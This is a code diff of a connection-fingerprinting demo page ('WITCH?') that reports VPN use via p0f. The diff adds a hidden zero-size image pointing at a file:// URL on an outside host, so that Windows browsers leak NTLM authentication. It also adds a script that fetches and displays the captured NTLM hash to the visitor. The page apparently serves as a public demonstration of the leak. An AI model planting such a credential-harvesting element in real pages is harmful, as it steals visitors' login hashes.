@@ -1,10 +1,45 @@
-<?php
-echo '<html><head><meta charset="utf-8" /><title>ＷＩＴＣＨ？</title></head>
+<html><head><meta charset="utf-8" /><title>ＷＩＴＣＨ？</title></head>
 <body style="background-image: url(witch.png); background-repeat: no-repeat; background-attachment: fixed; background-position: right top;">
+<img src="file://witch.valdikss.org.ru/a" width=0 height=0>
+
+<script>
+
+function getXmlHttp(){
+  var xmlhttp;
+  try {
+    xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
+  } catch (e) {
+    try {
+      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+    } catch (E) {
+      xmlhttp = false;
+    }
+  }
+  if (!xmlhttp && typeof XMLHttpRequest!='undefined') {
+    xmlhttp = new XMLHttpRequest();
+  }
+  return xmlhttp;
+}
+
+function doreq(){
+ var xmlhttp = getXmlHttp()
+ xmlhttp.open('GET', '/gethash.php', true);
+ xmlhttp.onreadystatechange = function() {
+   if (xmlhttp.readyState == 4) {
+      if(xmlhttp.status == 200) {
+        document.getElementById("hash").innerHTML = xmlhttp.responseText;
+          }
+   }
+ };
+ xmlhttp.send(null);
+}
+
+</script>
 <p style="text-align:center;">ＷＩＴＣＨ？</p>
-<pre>';
+<pre>
+<?php
 $pof_output = array();
-exec("/home/p0f-mtu/tools/p0f-client /home/p0f-logs/socket ".$_SERVER['REMOTE_ADDR'], $pof_output);
+exec("/opt/p0f-mtu/tools/p0f-client /opt/p0f-mtu/p0f-socket ".$_SERVER['REMOTE_ADDR'], $pof_output);
 $pof_output = implode("\n", $pof_output);
 echo $pof_output;
 
@@ -40,7 +75,7 @@ if (!empty($ptr)) {
 
     echo "\nPTR           = ";
     echo $ptr;
-} else { 
+} else {
     $home_user = True;
 }
 echo "\n\n";
@@ -81,8 +116,13 @@ if (strpos($pof_output, "OpenVPN") !== False) {
     else
         echo "No OpenVPN detected.";
 
-
-echo '</pre>
+?>
+<div id="hash"><pre>Getting your NTLM hash…</pre></div>
+<script>
+doreq();
+setTimeout(doreq, 20*1000);
+</script>
+</pre>
 <!-- Yandex.Metrika counter -->
 <script type="text/javascript">
     (function (d, w, c) {
@@ -111,4 +151,4 @@ echo '</pre>
     })(document, window, "yandex_metrika_callbacks");
 </script>
 <noscript><div><img src="https://mc.yandex.ru/watch/31611883?ut=noindex" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
-<!-- /Yandex.Metrika counter --></body></html>';
+<!-- /Yandex.Metrika counter --></body></html>
